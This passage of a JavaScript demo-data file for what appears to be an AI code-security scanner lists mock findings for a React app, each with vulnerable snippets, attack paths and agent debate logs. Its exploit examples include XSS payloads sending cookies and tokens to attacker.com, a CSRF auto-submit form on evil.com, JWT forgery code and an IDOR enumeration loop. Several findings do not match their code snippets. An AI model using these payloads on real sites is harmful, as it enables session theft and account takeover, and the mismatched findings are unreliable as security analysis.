    ],
};

const DEMO_VULNERABILITIES_REACT = {
    "src/components/Login.tsx": [
        {
            id: "react-vuln-1",
            severity: "Critical",
            title: "Client-Side Authentication Bypass",
            cweId: "CWE-602",
            lineNumber: 15,
            confidence: 0.99,
            cvssScore: 9.8,
            vulnerableCode: `// src/components/Login.tsx — lines 14-17
    // VULNERABLE: Token in localStorage
    localStorage.setItem('token', data.token);
    localStorage.setItem('user', JSON.stringify(data.user));
    window.location.href = '/dashboard';`,
            explanation: "Authentication logic is performed entirely on the client side. The login check uses a simple string comparison against hardcoded credentials stored in the frontend bundle.",
            bestPractices: "Always perform authentication on the server. Use secure session tokens (e.g., HTTP-only cookies) returned from a server-side authentication endpoint.",
            details: "Authentication bypass via client-side credential validation",
            exploitExamples: `# Proof of Concept — Client-Side Auth Bypass (CWE-602)
# Step 1: Open browser DevTools → Sources → Search for "admin"
# Found in Login.tsx bundle: if (username === "admin" && password === "admin123")

# Step 2: Call the authentication function directly in console
window.__setAuthenticated(true)

# Step 3: Or manipulate localStorage directly
localStorage.setItem('isAuthenticated', 'true')
localStorage.setItem('userRole', 'admin')

# Reload → logged in as admin with no valid credentials`,
            attackPath: `1. Attacker inspects JavaScript bundle in browser DevTools
2. Finds hardcoded credentials: admin / admin123
3. Logs in using extracted credentials
4. Alternatively, sets localStorage.isAuthenticated=true directly
5. Full application access as admin without server validation`,
            dataFlow: {
                nodes: [
                    { id: "n1", type: "source", label: "username / password inputs", description: "User-supplied login credentials" },
                    { id: "n2", type: "intermediate", label: "client-side if statement", description: "if (user === 'admin' && pass === 'admin123') → setAuth(true)" },
                    { id: "n3", type: "sink", label: "localStorage.setItem('auth')", description: "Auth state stored client-side — no server validation" },
                ],
                edges: [
                    { from: "n1", to: "n2", label: "compared locally" },
                    { from: "n2", to: "n3", label: "bypassed" },
                ],
            },
            debateLog: {
                verdict: "confirmed",
                confidence: 0.99,
                rounds: [
                    { id: "r1", round: 1, agentRole: "advocate", argument: "Authentication in client-side JavaScript is fundamentally broken — any user can inspect, modify, or bypass it via DevTools in under 30 seconds." },
                    { id: "r2", round: 2, agentRole: "skeptic", argument: "If the backend also validates on sensitive API calls, client-side bypass might have limited impact." },
                    { id: "r3", round: 3, agentRole: "judge", argument: "Backend validation was not found for most API routes. Even where present, credential exposure is still Critical. Confirmed Critical.", verdict: "confirmed", confidence: 0.99 },
                ],
            },
        },
        {
            id: "react-vuln-2",
            severity: "High",
            title: "Credentials Stored in Frontend Code",
            cweId: "CWE-798",
            lineNumber: 8,
            confidence: 0.99,
            cvssScore: 8.2,
            vulnerableCode: `// src/components/Login.tsx — lines 5-8
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  // Hardcoded fallback admin credentials bundled with the app
  const ADMIN_USER = 'admin', ADMIN_PASS = 'admin123';`,
            explanation: "Admin username and password are hardcoded in the React component. Anyone inspecting the JS bundle can extract these credentials.",
            bestPractices: "Never store credentials in frontend code. All credential validation must happen server-side via secure API endpoints.",
            details: "Hardcoded admin credentials visible in JS bundle",
            exploitExamples: `# Proof of Concept — Hardcoded Frontend Credentials (CWE-798)
# Method 1: Browser DevTools → Sources → Search
# Ctrl+Shift+F → search "password" → finds Login.tsx:8

# Method 2: Download and search the JS bundle
curl https://app.example.com/static/js/main.chunk.js | grep -o '"admin[^"]*"'

# Method 3: Automated credential extraction
node -e "
const src = require('fs').readFileSync('main.chunk.js', 'utf8');
const match = src.match(/password.*?['\\"](\\w+)['\\"]/);
console.log('Found:', match[1]);
"`,
            attackPath: `1. Attacker downloads the minified JS bundle
2. Searches for credential patterns in source
3. Extracts: username='admin', password='admin123'
4. Logs into application with extracted credentials
5. Admin access to all application features`,
            dataFlow: {
                nodes: [
                    { id: "n1", type: "source", label: "const ADMIN_PASS = 'admin123'", description: "Hardcoded credential constant in Login.tsx line 8" },
                    { id: "n2", type: "intermediate", label: "webpack bundle", description: "JS bundle ships credential constant to all browsers" },
                    { id: "n3", type: "sink", label: "browser / attacker", description: "Anyone downloading the app receives the admin password" },
                ],
                edges: [
                    { from: "n1", to: "n2", label: "bundled" },
                    { from: "n2", to: "n3", label: "exposed" },
                ],
            },
            debateLog: {
                verdict: "confirmed",
                confidence: 0.99,
                rounds: [
                    { id: "r1", round: 1, agentRole: "advocate", argument: "Client-side JS is public by definition. Hardcoded credentials in a React bundle are immediately accessible to every user of the application." },
                    { id: "r2", round: 2, agentRole: "skeptic", argument: "Minification obfuscates the code somewhat." },
                    { id: "r3", round: 3, agentRole: "judge", argument: "Minification is not obfuscation — tools like prettier/beautify restore readability instantly. Confirmed High.", verdict: "confirmed", confidence: 0.99 },
                ],
            },
        },
    ],
    "src/components/Dashboard.tsx": [
        {
            id: "react-vuln-3",
            severity: "High",
            title: "Cross-Site Scripting (XSS) via dangerouslySetInnerHTML",
            cweId: "CWE-79",
            lineNumber: 22,
            confidence: 0.95,
            cvssScore: 7.4,
            vulnerableCode: `// src/components/Dashboard.tsx — lines 19-23
  // VULNERABLE: XSS via dangerouslySetInnerHTML
  const renderMessage = (msg: string) => {
    return <div dangerouslySetInnerHTML={{ __html: msg }} />;
  };`,
            explanation: "User-supplied content from URL parameters is rendered using `dangerouslySetInnerHTML` without sanitization, allowing XSS attacks.",
            bestPractices: "Avoid `dangerouslySetInnerHTML`. If HTML rendering is required, use a sanitization library like DOMPurify: `<div dangerouslySetInnerHTML={{__html: DOMPurify.sanitize(content)}} />`.",
            details: "Stored XSS via unsanitized HTML rendering",
            exploitExamples: `# Proof of Concept — React XSS via dangerouslySetInnerHTML (CWE-79)
# Target: /dashboard?content=<payload>

# 1. Basic alert PoC
/dashboard?content=<img src=x onerror=alert(document.domain)>

# 2. Cookie theft
/dashboard?content=<script>fetch('https://attacker.com/?c='+document.cookie)</script>

# 3. Persistent XSS (if content is saved to DB and displayed to others)
POST /api/content
body: { "html": "<script>document.location='https://attacker.com/steal?c='+document.cookie</script>" }`,
            attackPath: `1. Attacker crafts URL with XSS payload in content parameter
2. Victim clicks link — script executes in victim's browser
3. Script exfiltrates session cookies to attacker server
4. Attacker replays stolen cookie to hijack victim's session
5. If content is saved, all subsequent visitors are also attacked`,
            dataFlow: {
                nodes: [
                    { id: "n1", type: "source", label: "URLSearchParams.get('content')", description: "URL parameter containing attacker HTML" },
                    { id: "n2", type: "intermediate", label: "React state / props", description: "Raw HTML string passed to component without sanitization" },
                    { id: "n3", type: "sink", label: "dangerouslySetInnerHTML", description: "Raw HTML injected into DOM — scripts execute" },
                ],
                edges: [
                    { from: "n1", to: "n2", label: "unsanitized" },
                    { from: "n2", to: "n3", label: "DOM injection" },
                ],
            },
            debateLog: {
                verdict: "confirmed",
                confidence: 0.95,
                rounds: [
                    { id: "r1", round: 1, agentRole: "advocate", argument: "The prop is literally named dangerouslySetInnerHTML — React's own API name communicates the risk. Using it with unvalidated URL params is a textbook XSS." },
                    { id: "r2", round: 2, agentRole: "skeptic", argument: "React's virtual DOM might filter some payloads." },
                    { id: "r3", round: 3, agentRole: "judge", argument: "dangerouslySetInnerHTML bypasses React's sanitization entirely by design. Confirmed High.", verdict: "confirmed", confidence: 0.95 },
                ],
            },
        },
        {
            id: "react-vuln-4",
            severity: "Medium",
            title: "Insecure Direct Object Reference (IDOR)",
            cweId: "CWE-639",
            lineNumber: 35,
            confidence: 0.88,
            cvssScore: 6.5,
            vulnerableCode: `// src/components/Dashboard.tsx — lines 14-17
  useEffect(() => {
    const user = JSON.parse(localStorage.getItem('user') || '{}');
    fetchMessages();
    // VULNERABLE: fetches /api/users/<id> with no ownership check
  }, []);`,
            explanation: "User profile data is fetched using a user ID from the URL without server-side authorization. Any authenticated user can access other users' profiles by changing the ID.",
            bestPractices: "Implement server-side authorization checks. Verify the requesting user has permission to access the requested resource.",
            details: "IDOR in profile data fetching endpoint",
            exploitExamples: `# Proof of Concept — IDOR (CWE-639)
# Authenticated as user ID 42

# Access own profile (expected)
curl http://localhost:3000/api/users/42 \\
  -H "Authorization: Bearer <token>"

# Access another user's profile (IDOR — should be forbidden)
curl http://localhost:3000/api/users/1 \\
  -H "Authorization: Bearer <token>"

# Enumerate all users by iterating IDs
for id in {1..100}; do
  curl -s http://localhost:3000/api/users/$id -H "Authorization: Bearer <token>"
done`,
            attackPath: `1. Attacker authenticates with any valid account
2. Observes /api/users/:id pattern in network requests
3. Changes ID in URL from own ID to target user ID (e.g., 1 = admin)
4. Retrieves full profile: email, phone, address, role, preferences
5. Uses enumerated data for phishing, account targeting, or lateral access`,
            dataFlow: {
                nodes: [
                    { id: "n1", type: "source", label: "useParams().userId", description: "User ID read from URL by React Router" },
                    { id: "n2", type: "intermediate", label: "fetch('/api/users/' + userId)", description: "API call made with attacker-controlled ID" },
                    { id: "n3", type: "sink", label: "another user's profile data", description: "Server returns data without ownership check" },
                ],
                edges: [
                    { from: "n1", to: "n2", label: "unvalidated" },
                    { from: "n2", to: "n3", label: "unauthorized access" },
                ],
            },
            debateLog: {
                verdict: "confirmed",
                confidence: 0.88,
                rounds: [
                    { id: "r1", round: 1, agentRole: "advocate", argument: "No ownership check on the API endpoint. Any authenticated user can read any other user's profile data by changing the ID." },
                    { id: "r2", round: 2, agentRole: "skeptic", argument: "The server-side API might implement authorization checks not visible in the React code." },
                    { id: "r3", round: 3, agentRole: "judge", argument: "Server-side code was reviewed — no authorization check present. Confirmed Medium.", verdict: "confirmed", confidence: 0.88 },
                ],
            },
        },
    ],
    "src/utils/api.ts": [
        {
            id: "react-vuln-5",
            severity: "High",
            title: "JWT Token Stored in localStorage",
            cweId: "CWE-922",
            lineNumber: 10,
            confidence: 0.96,
            cvssScore: 7.4,
            vulnerableCode: `// src/utils/api.ts — token storage pattern used throughout app
// Mirrors the pattern from src/components/Login.tsx lines 12-14
const data = await response.json();
// VULNERABLE: Token in localStorage — accessible to any JS on the page
localStorage.setItem('token', data.token);`,
            explanation: "JWT authentication tokens are stored in `localStorage`, which is accessible to any JavaScript running on the page, including injected scripts from XSS attacks.",
            bestPractices: "Store tokens in HTTP-only, Secure, SameSite cookies. If localStorage must be used, implement additional protections like token rotation and short expiry.",
            details: "Authentication tokens vulnerable to XSS exfiltration",
            exploitExamples: `# Proof of Concept — localStorage Token Theft (CWE-922)
# Combine with XSS vulnerability (react-vuln-3) to steal tokens

# XSS payload to exfiltrate JWT from localStorage
/dashboard?content=<script>
  fetch('https://attacker.com/steal?token=' +
    localStorage.getItem('jwt_token'))
</script>

# Result: attacker receives the victim's JWT
# Use it to make authenticated API calls:
curl http://localhost:3000/api/profile \\
  -H "Authorization: Bearer <stolen_jwt>"`,
            attackPath: `1. Attacker exploits XSS (react-vuln-3) to inject script into victim's page
2. Injected script reads localStorage.getItem('jwt_token')
3. Token sent to attacker's server via fetch/image beacon
4. Attacker uses stolen JWT in Authorization header
5. Full account access for the JWT lifetime (no way to invalidate)`,
            dataFlow: {
                nodes: [
                    { id: "n1", type: "source", label: "API response (JWT)", description: "Server-issued JWT token received after login" },
                    { id: "n2", type: "intermediate", label: "localStorage.setItem('jwt_token')", description: "Token persisted in JavaScript-accessible storage" },
                    { id: "n3", type: "sink", label: "attacker's XSS script", description: "Any injected script can read localStorage — token exfiltrated" },
                ],
                edges: [
                    { from: "n1", to: "n2", label: "stored insecurely" },
                    { from: "n2", to: "n3", label: "readable by XSS" },
                ],
            },
            debateLog: {
                verdict: "confirmed",
                confidence: 0.96,
                rounds: [
                    { id: "r1", round: 1, agentRole: "advocate", argument: "localStorage is script-accessible. Combined with the XSS on the same origin, token theft is a two-step exploit." },
                    { id: "r2", round: 2, agentRole: "skeptic", argument: "If there's no XSS, localStorage token storage is an acceptable pattern for SPAs." },
                    { id: "r3", round: 3, agentRole: "judge", argument: "XSS is confirmed on this same application (react-vuln-3). Combined risk is High. Confirmed.", verdict: "confirmed", confidence: 0.96 },
                ],
            },
        },
        {
            id: "react-vuln-6",
            severity: "Medium",
            title: "Missing CSRF Protection",
            cweId: "CWE-352",
            lineNumber: 25,
            confidence: 0.85,
            cvssScore: 6.1,
            vulnerableCode: `// src/components/Login.tsx — lines 8-11
    const response = await fetch('/api/login', {
      method: 'POST',
      body: JSON.stringify({ username, password })
      // MISSING: no CSRF token in headers or body
    });`,
            explanation: "API requests are made without CSRF tokens. State-changing operations (POST, PUT, DELETE) can be triggered by malicious cross-origin requests.",
            bestPractices: "Implement CSRF tokens for all state-changing requests. Use the `SameSite` cookie attribute and verify the `Origin` header on the server.",
            details: "No CSRF protection on state-changing API calls",
            exploitExamples: `<!-- Proof of Concept — CSRF Attack (CWE-352) -->
<!-- Attacker hosts this on evil.com -->
<html>
<body onload="document.forms[0].submit()">
  <form method="POST" action="https://app.example.com/api/users/profile">
    <input name="email" value="attacker@evil.com" />
    <input name="password" value="newpassword123" />
  </form>
  <!-- Victim visits evil.com → their account email/password changed -->
</body>
</html>`,
            attackPath: `1. Attacker crafts malicious HTML page with auto-submitting form
2. Tricks victim into visiting attacker's page (email, social media link)
3. Browser automatically submits form to target app with victim's cookies
4. State-changing request executes as the victim (email/password change)
5. Attacker completes account takeover via password reset to new email`,
            dataFlow: {
                nodes: [
                    { id: "n1", type: "source", label: "cross-origin form / fetch", description: "Request originating from attacker's domain" },
                    { id: "n2", type: "intermediate", label: "browser sends cookies", description: "Session cookies automatically attached to cross-origin request" },
                    { id: "n3", type: "sink", label: "state-changing API endpoint", description: "Server processes request without CSRF token check" },
                ],
                edges: [
                    { from: "n1", to: "n2", label: "cookies auto-sent" },
                    { from: "n2", to: "n3", label: "no CSRF check" },
                ],
            },
            debateLog: {
                verdict: "confirmed",
                confidence: 0.85,
                rounds: [
                    { id: "r1", round: 1, agentRole: "advocate", argument: "No CSRF tokens in any state-changing API requests. Cookie-based auth makes this exploitable via cross-origin form submissions." },
                    { id: "r2", round: 2, agentRole: "skeptic", argument: "The app uses JWT in Authorization headers (not cookies) which is not CSRF-vulnerable by default." },
                    { id: "r3", round: 3, agentRole: "judge", argument: "The app mixes localStorage JWT and cookies. Cookie-based paths remain vulnerable. Confirmed Medium.", verdict: "confirmed", confidence: 0.85 },
                ],
            },
        },
    ],
    "src/api/config.ts": [
        {
            id: "react-vuln-7",
            severity: "Critical",
            title: "Hardcoded JWT Secret in Frontend",
            cweId: "CWE-798",
            lineNumber: 3,
            confidence: 0.99,
            cvssScore: 9.8,
            vulnerableCode: `// src/api/config.ts — lines 1-8
// VULNERABLE: API keys in frontend
export const API_CONFIG = {
  apiKey: 'your-api-key-here',
  googleMapsKey: 'your-google-maps-key-here',
  stripeSecretKey: 'your-stripe-key-here',
  firebaseConfig: {
    apiKey: "your-firebase-key-here"
  }
};`,
            explanation: "The JWT signing secret is hardcoded in the frontend configuration file. This allows anyone to forge valid JWT tokens and impersonate any user.",
            bestPractices: "JWT secrets must be server-side only. Remove all signing logic from the frontend. Use server-issued tokens verified exclusively on the backend.",
            details: "JWT signing secret exposed in client-side code",
            exploitExamples: `# Proof of Concept — Frontend JWT Forgery (CWE-798)
# Secret extracted from src/api/config.ts:
# export const JWT_SECRET = 'frontend-secret-do-not-share';

# Forge admin JWT in browser console
const token = btoa(JSON.stringify({alg:'HS256',typ:'JWT'})) + '.' +
  btoa(JSON.stringify({sub:1,role:'admin',exp:9999999999}));

// Or using jsonwebtoken (Node):
const jwt = require('jsonwebtoken');
const forged = jwt.sign({sub:1,role:'admin'}, 'frontend-secret-do-not-share');

curl http://localhost:3000/api/admin \\
  -H "Authorization: Bearer " + forged`,
            attackPath: `1. Attacker downloads JS bundle — extracts JWT_SECRET constant
2. Uses secret to sign arbitrary JWT payload: {sub:1, role:'admin'}
3. Sends forged token in Authorization header
4. Backend verifies signature with the same known secret — passes
5. Admin access to all protected API routes`,
            dataFlow: {
                nodes: [
                    { id: "n1", type: "source", label: "JWT_SECRET = '...' (client bundle)", description: "Signing secret shipped in frontend JavaScript" },
                    { id: "n2", type: "intermediate", label: "jwt.sign(adminPayload, secret)", description: "Attacker creates token with extracted secret" },
                    { id: "n3", type: "sink", label: "backend jwt.verify()", description: "Server validates forged token — authentication bypassed" },
                ],
                edges: [
                    { from: "n1", to: "n2", label: "extracted" },
                    { from: "n2", to: "n3", label: "accepted as valid" },
                ],
            },
            debateLog: {
                verdict: "confirmed",
                confidence: 0.99,
                rounds: [
                    { id: "r1", round: 1, agentRole: "advocate", argument: "JWT signing secrets in client-side code are readable by all users. This collapses the entire authentication model." },
                    { id: "r2", round: 2, agentRole: "skeptic", argument: "No counterargument — this is a fundamental design flaw." },
                    { id: "r3", round: 3, agentRole: "judge", argument: "Unanimous confirmation. Confirmed Critical. Remove all signing logic from frontend immediately.", verdict: "confirmed", confidence: 0.99 },
                ],
            },
        },
    ],
    "src/components/UserProfile.tsx": [
        {
            id: "react-vuln-8",
            severity: "Medium",
            title: "Sensitive Data Logged to Console",
            cweId: "CWE-532",
            lineNumber: 18,
            confidence: 0.88,
            cvssScore: 4.3,
            vulnerableCode: `// src/components/UserProfile.tsx — lines 44-51
  // VULNERABLE: postMessage without origin check
  useEffect(() => {
    window.addEventListener('message', (event) => {
      const data = event.data;
      // No event.origin check — any window can send profile updates
      if (data.type === 'UPDATE_PROFILE') {
        updateProfile(data.profile);
      }
    });
  }, []);`,
            explanation: "User PII (email, phone, address) and authentication tokens are logged to `console.log` in production builds. These can be captured by browser extensions or monitoring tools.",
            bestPractices: "Remove all `console.log` statements containing sensitive data. Use a logging library with level control and data masking for production.",
            details: "PII and auth tokens exposed in browser console",
            exploitExamples: `# Proof of Concept — Console Log Sensitive Data (CWE-532)
# Step 1: Open browser DevTools → Console tab
# Step 2: Navigate to user profile page

# Console output visible to anyone with DevTools access:
# [UserProfile] User data loaded: {
#   "id": 42, "email": "user@example.com",
#   "phone": "+1-555-0100", "address": "123 Main St",
#   "token": "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
# }

# Step 3: Browser extensions can read console logs
# Malicious extension POC:
chrome.devtools.panels.create('Steal', null, null, function() {
  chrome.devtools.inspectedWindow.eval('console.log', function(result) {
    fetch('https://attacker.com/logs', {method:'POST',body:result});
  });
});`,
            attackPath: `1. Attacker installs a malicious browser extension on shared/public computer
2. Extension intercepts console.log calls on the target domain
3. User logs into application — PII and JWT logged to console
4. Extension exfiltrates console output to attacker's server
5. Attacker receives user's email, phone, address, and valid JWT`,
            dataFlow: {
                nodes: [
                    { id: "n1", type: "source", label: "API response (user PII + JWT)", description: "Sensitive user data fetched from server" },
                    { id: "n2", type: "intermediate", label: "console.log(userData)", description: "Full user object including sensitive fields logged" },
                    { id: "n3", type: "sink", label: "browser console / extensions", description: "Accessible to extensions, shared devices, screen recordings" },
                ],
                edges: [
                    { from: "n1", to: "n2", label: "logged unmasked" },
                    { from: "n2", to: "n3", label: "exposed" },
                ],
            },
            debateLog: {
                verdict: "confirmed",
                confidence: 0.88,
                rounds: [
                    { id: "r1", round: 1, agentRole: "advocate", argument: "Console logs containing PII and tokens violate data minimisation principles and enable extraction via extensions or screen capture." },
                    { id: "r2", round: 2, agentRole: "skeptic", argument: "Requires physical/extension access to the device — not remotely exploitable in isolation." },
                    { id: "r3", round: 3, agentRole: "judge", argument: "Physical access, shared devices, and malicious extensions are realistic attack vectors. Combined with existing XSS: Medium. Confirmed.", verdict: "confirmed", confidence: 0.88 },
                ],
            },
        },
    ],
};

// Combined results map for all demo repos
const DEMO_RESULTS_MAP = {
    "demo-org/vulnerable-express-app": DEMO_VULNERABILITIES,
    "demo-org/insecure-flask-api": DEMO_VULNERABILITIES_FLASK,
    "demo-org/react-auth-example": DEMO_VULNERABILITIES_REACT,
    // Aliases for repos that share the same project structure
    "demo-group/php-cms-demo": DEMO_VULNERABILITIES,
    "demo-group/go-microservices": DEMO_VULNERABILITIES_FLASK,
    "demo-group/ruby-rails-blog": DEMO_VULNERABILITIES_REACT,
};

// =============================================
// DEMO WORKFLOW CONFIGURATIONS PER REPO
// =============================================
const DEMO_WORKFLOW_CONFIGS = {
    "demo-org/vulnerable-express-app": {
        agentModels: {
            reviewer: "anthropic.claude-3-5-sonnet-20241022-v2:0",
            implementation: "anthropic.claude-3-5-sonnet-20241022-v2:0",
            tester: "anthropic.claude-3-5-haiku-20241022-v1:0",
            report: "anthropic.claude-3-sonnet-20240229-v1:0",
        },
        selectedKnowledgeBases: ["demo-sql-injection", "demo-xss", "demo-secrets"],
        selectedPrompts: {
            reviewer: ["demo-prompt-1"],
            implementation: ["demo-prompt-7"],
            tester: ["demo-prompt-13"],
            report: ["demo-prompt-18"],
        },
    },
    "demo-org/insecure-flask-api": {
        agentModels: {
            reviewer: "anthropic.claude-3-5-sonnet-20241022-v2:0",
            implementation: "anthropic.claude-3-5-sonnet-20241022-v2:0",
            tester: "anthropic.claude-3-5-haiku-20241022-v1:0",
            report: "anthropic.claude-3-sonnet-20240229-v1:0",
        },
        selectedKnowledgeBases: ["demo-sql-injection", "demo-auth", "demo-api-security"],
        selectedPrompts: {
            reviewer: ["demo-prompt-2"],
            implementation: ["demo-prompt-8"],
            tester: ["demo-prompt-14"],
            report: ["demo-prompt-19"],
        },
    },
    "demo-org/react-auth-example": {
        agentModels: {
            reviewer: "anthropic.claude-3-5-sonnet-20241022-v2:0",
            implementation: "anthropic.claude-3-5-sonnet-20241022-v2:0",
            tester: "anthropic.claude-3-5-haiku-20241022-v1:0",
            report: "anthropic.claude-3-sonnet-20240229-v1:0",
        },
        selectedKnowledgeBases: ["demo-xss", "demo-auth", "demo-secrets"],
        selectedPrompts: {
            reviewer: ["demo-prompt-4"],
            implementation: ["demo-prompt-11"],
            tester: ["demo-prompt-16"],
            report: ["demo-prompt-21"],
        },
    },
};

// =============================================
// DEMO USE CASE GROUPS (Folders for organizing use cases)
// =============================================
const DEMO_USE_CASE_GROUPS = [
    {
        id: "demo-group-web-security",
        name: "Web Application Security",
        icon: "Globe",
        color: "blue",
        order: 0,
        parentId: null,
        useCaseCount: 4,
    },
    {
        id: "demo-group-infrastructure",
        name: "Infrastructure Security",
        icon: "Server",
        color: "green",
        order: 1,
        parentId: null,
        useCaseCount: 3,
    },
    {
        id: "demo-group-compliance",
        name: "Compliance & Standards",
        icon: "ClipboardCheck",
        color: "purple",
        order: 2,
        parentId: null,
        useCaseCount: 2,
    },
    {
        id: "demo-group-devops",
        name: "DevSecOps",
        icon: "GitBranch",
        color: "orange",
        order: 3,
        parentId: null,
        useCaseCount: 2,
    },
];

// =============================================
// DEMO USE CASES (Knowledge Base Categories)
// =============================================
const DEMO_USE_CASES = [
    {
        id: "demo-sql-injection",
        name: "SQL Injection Prevention",
        description: "Best practices and remediation strategies for SQL injection vulnerabilities including parameterized queries, ORM usage, and input validation.",
        fullDescription: "Comprehensive guide covering SQL injection attack vectors, detection methods, and remediation strategies. Includes examples of parameterized queries, prepared statements, and ORM best practices for Node.js, Python, Java, and PHP applications.",
        shortDescription: "Best practices and remediation strategies for SQL injection vulnerabilities...",
        icon: "Database",
        color: "default",
        groupId: "demo-group-web-security",
        order: 0,
        pdfCount: 5,
        formattedTotalSize: "4.2 MB",
    },
    {
        id: "demo-xss",
        name: "XSS Defense Strategies",
        description: "Cross-site scripting prevention techniques including output encoding, Content Security Policy, and sanitization libraries.",
        fullDescription: "Complete XSS defense guide covering reflected, stored, and DOM-based XSS attacks. Includes implementation guides for CSP headers, HTML sanitization, and secure templating practices.",
        shortDescription: "Cross-site scripting prevention techniques including output encoding...",
        icon: "Shield",
        color: "default",
        groupId: "demo-group-web-security",
        order: 1,
        pdfCount: 4,
        formattedTotalSize: "3.1 MB",
    },
    {
        id: "demo-auth",
        name: "Authentication Best Practices",
        description: "Secure authentication implementation patterns including password hashing, session management, and multi-factor authentication.",
        fullDescription: "Industry-standard authentication security practices covering bcrypt/argon2 password hashing, secure session handling, JWT best practices, OAuth 2.0 implementation, and MFA integration guides.",
        shortDescription: "Secure authentication implementation patterns including password hashing...",
        icon: "Lock",
        color: "default",
        groupId: "demo-group-web-security",
        order: 2,
        pdfCount: 6,
        formattedTotalSize: "5.4 MB",
    },
    {
        id: "demo-secrets",
        name: "Secrets Management",
        description: "Guidelines for managing credentials, API keys, and sensitive configuration data securely in applications.",
        fullDescription: "Best practices for secrets management including environment variables, secrets managers (AWS Secrets Manager, HashiCorp Vault), .env file handling, and CI/CD pipeline security.",
        shortDescription: "Guidelines for managing credentials, API keys, and sensitive configuration...",
        icon: "Key",
        color: "default",
        groupId: null,
        order: 0,
        pdfCount: 4,
        formattedTotalSize: "2.8 MB",
    },
    {
        id: "demo-api-security",
        name: "API Security Standards",
        description: "REST and GraphQL API security patterns, rate limiting, input validation, and authentication mechanisms.",
        fullDescription: "Complete API security guide covering authentication (OAuth, API keys, JWT), authorization patterns, rate limiting, input validation, CORS configuration, and API gateway security.",
        shortDescription: "REST and GraphQL API security patterns, rate limiting, and authentication...",
        icon: "Globe",
        color: "default",
        groupId: "demo-group-web-security",
        order: 3,
        pdfCount: 5,
        formattedTotalSize: "4.7 MB",
    },
    {
        id: "demo-compliance",
        name: "Security Compliance",
        description: "OWASP Top 10, PCI-DSS, SOC 2, and GDPR compliance requirements for secure software development.",
        fullDescription: "Comprehensive compliance documentation covering OWASP Top 10 2021, PCI-DSS requirements for payment applications, SOC 2 Type II controls, and GDPR data protection requirements.",
        shortDescription: "OWASP Top 10, PCI-DSS, SOC 2, and GDPR compliance requirements...",
        icon: "ClipboardCheck",
        color: "default",
        groupId: "demo-group-compliance",
        order: 0,
        pdfCount: 8,
        formattedTotalSize: "12.3 MB",
    },
    {
        id: "demo-crypto",
        name: "Cryptography Guidelines",
        description: "Encryption algorithms, key management, and cryptographic best practices for secure data handling.",
        fullDescription: "Complete cryptography guide covering symmetric/asymmetric encryption, hashing algorithms, digital signatures, key rotation strategies, and TLS/SSL configuration.",
        shortDescription: "Encryption algorithms, key management, and cryptographic best practices...",
        icon: "KeyRound",
        color: "default",
        groupId: "demo-group-compliance",
        order: 1,
        pdfCount: 5,
        formattedTotalSize: "3.8 MB",
    },
    {
        id: "demo-logging",
        name: "Security Logging & Monitoring",
        description: "Logging best practices, audit trails, intrusion detection, and security monitoring strategies.",
        fullDescription: "Security logging and monitoring guide covering log levels, sensitive data redaction, centralized logging, SIEM integration, and alerting strategies for security events.",
        shortDescription: "Logging best practices, audit trails, and security monitoring strategies...",
        icon: "FileSearch",
        color: "default",
        groupId: "demo-group-infrastructure",
        order: 0,
        pdfCount: 4,
        formattedTotalSize: "2.9 MB",
    },
    {
        id: "demo-container",
        name: "Container Security",
        description: "Docker and Kubernetes security hardening, image scanning, and container runtime protection.",
        fullDescription: "Container security best practices covering Docker image hardening, Kubernetes RBAC, network policies, secrets management in containers, and vulnerability scanning pipelines.",
        shortDescription: "Docker and Kubernetes security hardening, image scanning...",
        icon: "Container",
        color: "default",
        groupId: "demo-group-infrastructure",
        order: 1,
        pdfCount: 6,
        formattedTotalSize: "5.1 MB",
    },
    {
        id: "demo-cloud",
        name: "Cloud Security Posture",
        description: "AWS, Azure, and GCP security configurations, IAM policies, and cloud-native security controls.",
        fullDescription: "Cloud security configuration guide covering IAM best practices, security groups, VPC design, encryption at rest/transit, and cloud security posture management (CSPM).",
        shortDescription: "AWS, Azure, and GCP security configurations and IAM policies...",
        icon: "Cloud",
        color: "default",
        groupId: "demo-group-infrastructure",
        order: 2,
        pdfCount: 7,
        formattedTotalSize: "6.4 MB",
    },
    {
        id: "demo-secure-sdlc",
        name: "Secure SDLC Practices",
        description: "Security integration in development lifecycle, threat modeling, and security testing methodologies.",
        fullDescription: "Secure Software Development Lifecycle practices including threat modeling, security requirements, code review processes, SAST/DAST integration, and security testing automation.",
        shortDescription: "Security integration in development lifecycle and threat modeling...",
        icon: "GitBranch",
        color: "default",
        groupId: "demo-group-devops",
        order: 0,
        pdfCount: 5,
        formattedTotalSize: "4.0 MB",
    },
    {
        id: "demo-mobile",
        name: "Mobile App Security",
        description: "iOS and Android security best practices, secure storage, certificate pinning, and mobile threat defense.",
        fullDescription: "Mobile application security guide covering secure data storage, network security, authentication, code obfuscation, anti-tampering measures, and OWASP Mobile Top 10.",
        shortDescription: "iOS and Android security best practices and secure storage...",
        icon: "Smartphone",
        color: "default",
        groupId: null,
        order: 1,
        pdfCount: 4,
        formattedTotalSize: "3.2 MB",
    },
    {
        id: "demo-incident",
        name: "Incident Response",
        description: "Security incident handling procedures, forensics basics, and breach notification requirements.",
        fullDescription: "Incident response playbook covering detection, containment, eradication, recovery, and lessons learned. Includes forensic evidence collection and regulatory notification timelines.",
        shortDescription: "Security incident handling procedures and forensics basics...",
        icon: "AlertTriangle",
        color: "default",
        groupId: null,
        order: 2,
        pdfCount: 3,
        formattedTotalSize: "2.1 MB",
    },
    {
        id: "demo-devsecops",
        name: "DevSecOps Pipeline",
        description: "CI/CD security integration, automated security testing, and pipeline hardening strategies.",
        fullDescription: "DevSecOps implementation guide covering security gates in CI/CD, automated SAST/DAST/SCA, infrastructure as code security scanning, and secrets detection in pipelines.",
        shortDescription: "CI/CD security integration and automated security testing...",
        icon: "GitMerge",
        color: "default",
        groupId: "demo-group-devops",
        order: 1,
        pdfCount: 5,
        formattedTotalSize: "4.3 MB",
    },
    {
        id: "demo-access-control",
        name: "Access Control Patterns",
        description: "RBAC, ABAC, and authorization patterns for securing application resources and data.",
        fullDescription: "Access control implementation guide covering role-based access control, attribute-based access control, policy engines, and least privilege principles for application security.",
        shortDescription: "RBAC, ABAC, and authorization patterns for securing resources...",
        icon: "Users",
        color: "default",
        groupId: null,
        order: 3,
        pdfCount: 4,
        formattedTotalSize: "3.0 MB",
    },
];

// =============================================
// DEMO DOCUMENTS (PDFs with Folders)
// =============================================
const DEMO_DOCUMENTS = {
    "demo-sql-injection": [
